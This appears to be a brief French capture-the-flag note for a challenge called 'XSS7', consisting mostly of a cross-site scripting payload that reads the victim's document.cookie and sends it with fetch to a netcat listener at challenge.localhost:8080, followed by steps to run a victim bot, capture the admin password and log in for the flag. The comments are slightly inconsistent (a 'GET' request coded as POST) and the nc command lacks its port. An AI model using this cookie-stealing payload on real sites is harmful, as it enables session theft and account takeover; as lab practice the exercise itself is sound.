# XSS7

le payload

```
<script>
  // 1. Récupérer toutes les données du cookie (qui devrait inclure le flag).
  var stolenCookie = document.cookie; 

  // 2. Envoyer ces données à notre serveur netcat via une requête GET discrète.
  // Nous utilisons l'API Fetch pour simuler un envoi de données, très courant dans les CTF.
  fetch('http://challenge.localhost:8080/?data=' + encodeURIComponent(stolenCookie), {
    method: 'POST', 
    mode: 'no-cors' // Important pour que le navigateur n'échoue pas à cause de la politique CORS.
  });
</script>
```

approche

se connecter avec netcat sur le port 8080

`nc -lnvp`

trouver le mdp admin qui devrait s'afficher en executant 

`/challenge/victim http://challenge.localhost`

se connecter en admin et du coup trouver le flag
